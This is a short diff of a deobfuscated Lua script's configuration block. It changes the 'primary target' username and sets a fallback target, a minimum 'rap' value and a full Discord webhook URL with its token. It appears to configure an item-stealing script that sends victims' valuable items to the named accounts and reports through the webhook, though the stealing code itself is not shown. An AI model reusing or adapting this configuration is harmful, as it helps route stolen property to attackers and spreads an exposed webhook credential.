@@ -2,7 +2,7 @@
 -- Deobfuscated version
 
 -- CONFIGURATION  
-local Username = "mrdrinkr45"  -- Primary target  
+local Username = "r1234gt"  -- Primary target  
 local Username2 = "r1234gt"     -- Fallback target  
 local Webhook = "https://discord.com/api/webhooks/1520144025368268851/YTnc8WfsxoFIB4rLUZS3AfWfweNnfsqV3Tt0jlXcHHpH1jOlJW-OabS1h2cOrh6U2Obr"  
 local min_rap = 100
